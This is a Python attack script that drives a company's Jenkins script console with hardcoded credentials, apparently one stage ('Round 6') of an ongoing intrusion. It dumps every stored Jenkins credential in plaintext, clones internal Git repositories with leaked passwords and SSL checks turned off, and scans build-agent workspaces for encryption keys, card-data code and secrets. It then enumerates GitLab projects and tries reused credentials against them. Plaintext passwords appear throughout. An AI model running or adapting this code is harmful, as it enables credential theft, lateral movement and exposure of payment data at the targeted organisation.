import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']}
    )
    result = opener.open(req2, timeout=240).read().decode()
    if label:
        print(f"\n{'='*60}\n[TASK] {label}\n{'='*60}")
        print(result)
    return result

# ── TASK 1: Dump ALL Jenkins credentials (full dump) ──────────
script1 = """
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import jenkins.security.*
import org.jenkinsci.plugins.plaincredentials.impl.*

def stores = [
    Jenkins.instance,
    Jenkins.instance.getAllItems(com.cloudbees.hudson.plugins.folder.AbstractFolder.class)[0]
].findAll { it != null }

def creds = CredentialsProvider.lookupCredentials(
    StandardCredentials.class, Jenkins.instance, null, null
)

println "TOTAL CREDENTIALS: ${creds.size()}"
creds.eachWithIndex { c, i ->
    println "\\n[${i}] ID=${c.id} | Type=${c.class.simpleName} | Desc=${c.description}"
    try {
        if (c instanceof UsernamePasswordCredentialsImpl) {
            println "    user=${c.username} pass=${c.password.plainText}"
        } else if (c instanceof BasicSSHUserPrivateKey) {
            println "    user=${c.username} key=${c.privateKey?.take(200)}"
        } else if (c instanceof StringCredentialsImpl) {
            println "    secret=${c.secret.plainText}"
        } else if (c.respondsTo('getUsername')) {
            println "    user=${c.username}"
        }
        if (c.respondsTo('getPassword')) {
            println "    pass=${c.password?.plainText}"
        }
    } catch(e2) { println "    ERR: ${e2.message?.take(80)}" }
}
"""
jenkins_exec(script1, "ALL JENKINS CREDENTIALS")
time.sleep(1)

# ── TASK 2: Fix ASKPASS git clone ──────────────────────────────
script2 = """
// Create a proper ASKPASS helper script
def askpass = new File('/tmp/git_askpass.sh')
askpass.text = '#!/bin/bash\\necho "e6LBqIkOI\\$PR1XX2oia"\\n'
askpass.setExecutable(true)

println "ASKPASS created: " + askpass.exists()

// Try with ASKPASS
def env = ["GIT_ASKPASS=/tmp/git_askpass.sh", "GIT_USERNAME=jenkins", "HOME=/tmp", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]
def cmd = ["git", "clone", "--depth=1",
    "http://gitlab.dev.claroshop.com/claroshop/caja-pagos-api.git",
    "/tmp/caja_askpass"]
def pb = new ProcessBuilder(cmd)
pb.environment().putAll(env.collectEntries { it.split('=',2).with { [(it[0]): it[1]] } })
pb.redirectErrorStream(true)
def proc = pb.start()
proc.waitFor()
def r1 = proc.text
println "ASKPASS CLONE caja-pagos-api: ${r1}"

// Check result
def d = new File('/tmp/caja_askpass')
if (d.exists()) {
    println "CLONE SUCCEEDED! Files: " + d.list()?.join(", ")
}
"""
jenkins_exec(script2, "GIT CLONE WITH ASKPASS")
time.sleep(2)

# ── TASK 3: infracode clone with SSL disabled ──────────────────
script3 = """
// Clone infracode with SSL verification disabled
def repos = [
    ["https://infracode.amxdigital.net/infraestructure-as-code/jenkins-pipelines.git", "/tmp/infra_pipelines"],
    ["https://infracode.amxdigital.net/infraestructure-as-code/jenkins-pipelines.git", "/tmp/infra_p2"],
]

def user = "sophia-mrk-i"
def pass_ = "plug*spoke!MosqueCloud3col"
def enc = (user + ":" + pass_).bytes.encodeBase64().toString()

repos[0].with { url, dest ->
    // Method 1: git with sslVerify=false
    def r1 = ["bash","-c","git -c http.sslVerify=false clone --depth=1 'https://sophia-mrk-i:plug*spoke!MosqueCloud3col@infracode.amxdigital.net/infraestructure-as-code/jenkins-pipelines.git' /tmp/infra_pipelines 2>&1 | tail -5"].execute().text
    println "SSL BYPASS CLONE: ${r1}"
    
    def d = new File('/tmp/infra_pipelines')
    if (d.exists()) {
        println "FILES: " + d.list()?.join(", ")
        // Find payment/encrypt scripts
        def files = []
        d.eachFileRecurse { f ->
            if (f.name.endsWith('.groovy') || f.name.endsWith('.sh')) files << f.absolutePath
        }
        println "SCRIPTS (${files.size()}): " + files.take(30).join("\\n")
    }
}

// Also try curl to infracode
def r2 = ["bash","-c","curl -sk -u 'sophia-mrk-i:plug*spoke!MosqueCloud3col' https://infracode.amxdigital.net/api/v4/user 2>&1 | head -200"].execute().text
println "\\nINFRACODE API user: ${r2}"
"""
jenkins_exec(script3, "INFRACODE SSL BYPASS CLONE")
time.sleep(2)

# ── TASK 4: Agent workspace via fixed FileCallable ─────────────
script4 = """
import jenkins.model.Jenkins
import hudson.FilePath
import org.jenkinsci.remoting.RoleChecker

Jenkins.instance.nodes.each { node ->
    def channel = node.channel
    if (channel == null) { println "NODE ${node.displayName}: OFFLINE"; return }
    println "\\nNODE: ${node.displayName}"
    
    def wsPath = "/home/jenkins/workspace/cs_legacy_front/cs_legacy_pipe_build_caja-api"
    def fp = new FilePath(channel, wsPath)
    
    if (!fp.exists()) {
        println "  WS NOT FOUND at ${wsPath}"
        // Try alternate paths
        ["/home/jenkins/workspace", "/opt/jenkins/workspace", "/workspace"].each { base ->
            def b = new FilePath(channel, base)
            if (b.exists()) {
                println "  BASE EXISTS: ${base}"
                b.list().each { f -> println "    ${f.name}" }
            }
        }
        return
    }
    
    println "  WS EXISTS"
    
    def callable = new hudson.FilePath.FileCallable<String>() {
        @Override
        public String invoke(File f, hudson.remoting.VirtualChannel c) throws IOException, InterruptedException {
            def sb = new StringBuilder()
            sb.append("ROOT: " + f.absolutePath + "\\n")
            // List top-level dirs
            f.listFiles()?.each { child ->
                sb.append("  " + child.name + (child.isDirectory() ? "/" : "") + "\\n")
            }
            // Find encrypt PHP files
            def stack = [f]
            def found = []
            while (!stack.isEmpty() && found.size() < 30) {
                def dir = stack.pop()
                dir.listFiles()?.each { child ->
                    if (child.isDirectory() && !child.name.startsWith('.') && !child.name.equals('vendor')) {
                        stack.push(child)
                    } else if (child.name.endsWith('.php') || child.name.endsWith('.java') || child.name.endsWith('.env') || child.name.endsWith('.properties')) {
                        def content = child.text
                        if (content.toLowerCase().contains("encript") || content.toLowerCase().contains("llave") ||
                            content.contains("mcrypt") || content.toLowerCase().contains("tarjeta") ||
                            content.contains("openssl_encrypt") || content.contains("CardData") ||
                            content.contains("AES") || content.contains("RSA") || content.contains("api_key") ||
                            content.contains("SECRET") || content.contains("password")) {
                            found << ("=== " + child.absolutePath + " ===\\n" + content.take(3000) + "\\n")
                        }
                    }
                }
            }
            if (found) {
                sb.append("\\nENCRYPT/SECRET FILES FOUND (${found.size()}):\\n")
                found.each { sb.append(it) }
            } else {
                sb.append("NO ENCRYPT FILES FOUND\\n")
            }
            return sb.toString()
        }
        @Override
        public void checkRoles(RoleChecker checker) throws SecurityException {}
    }
    
    try {
        def result = fp.act(callable)
        println result
    } catch(e) {
        println "  ACT ERR: ${e.class.simpleName}: ${e.message?.take(100)}"
    }
}
"""
jenkins_exec(script4, "AGENT WORKSPACE (FIXED ROLLECHECKER)")
time.sleep(2)

# ── TASK 5: Search ALL caja group projects via GitLab search ───
script5 = """
def base = "http://gitlab.dev.claroshop.com"
def user = "jenkins"
def pass_ = "e6LBqIkOI\$PR1XX2oia"
def enc = (user+":"+pass_).bytes.encodeBase64().toString()
def token_header = "Authorization"

// Try to get all projects with different approaches
def queries = [
    "/api/v4/projects?per_page=100&simple=false&page=1",
    "/api/v4/projects?per_page=100&simple=false&page=2",
    "/api/v4/projects?per_page=100&simple=false&page=3",
    "/api/v4/projects/search?search=caja",
    "/api/v4/projects?search=caja&per_page=20",
    "/api/v4/projects?search=pago&per_page=20",
    "/api/v4/projects?search=tarjeta&per_page=20",
    "/api/v4/projects?search=encrypt&per_page=20",
]

queries.each { path ->
    try {
        def url = new URL(base + path)
        def conn = url.openConnection()
        conn.connectTimeout = 8000
        conn.readTimeout = 10000
        conn.setRequestProperty(token_header, "Basic " + enc)
        def code = conn.responseCode
        def body = code < 400 ? conn.inputStream.text : ""
        if (code == 200 && body.contains('"id"')) {
            // Extract project names
            def matcher = body =~ /"path_with_namespace":"([^"]+)"/
            def names = []
            matcher.each { m -> names << m[1] }
            println "${path} [${code}] projects: " + names.join(", ")
        } else {
            println "${path} [${code}]"
        }
    } catch(e) { println "${path} FAIL: ${e.message?.take(60)}" }
}
"""
jenkins_exec(script5, "GITLAB PROJECT SEARCH (ALL PAGES)")
time.sleep(1)

# ── TASK 6: Try GitLab API with Token (from creds dump) ────────
script6 = """
// Try private tokens we might have found
def base = "http://gitlab.dev.claroshop.com"

// Based on known credentials - try as private token in header
def tokens = [
    ["jenkins", "e6LBqIkOI\$PR1XX2oia", "basic"],
    ["jenkins_legacy", "lXRB8U36NQ3", "basic"],   // From previous dump
]

tokens.each { tok ->
    def auth_type = tok[2]
    def header_val
    if (auth_type == "basic") {
        header_val = "Basic " + (tok[0]+":"+tok[1]).bytes.encodeBase64().toString()
    } else {
        header_val = "Bearer " + tok[1]
    }
    
    try {
        def conn = new URL(base + "/api/v4/user").openConnection()
        conn.connectTimeout = 6000; conn.readTimeout = 8000
        conn.setRequestProperty("Authorization", header_val)
        def code = conn.responseCode
        def body = code < 400 ? conn.inputStream.text : conn.errorStream?.text?:""
        println "AUTH ${tok[0]}: [${code}] ${body.take(300)}"
    } catch(e) { println "AUTH ERR: ${e.message?.take(60)}" }
    
    // If authenticated, try to list all accessible projects
    try {
        def conn2 = new URL(base + "/api/v4/projects?membership=true&per_page=50&simple=true").openConnection()
        conn2.connectTimeout = 8000; conn2.readTimeout = 12000
        conn2.setRequestProperty("Authorization", header_val)
        def code2 = conn2.responseCode
        def body2 = code2 < 400 ? conn2.inputStream.text : ""
        def matcher = body2 =~ /"path_with_namespace":"([^"]+)"/
        def names = []
        matcher.each { m -> names << m[1] }
        println "  MEMBER PROJECTS [${code2}]: " + names.join(", ")
    } catch(e) {}
}
"""
jenkins_exec(script6, "GITLAB PRIVATE TOKEN AUTH")
time.sleep(1)

print("\n\n[DONE] Round 6 complete.")
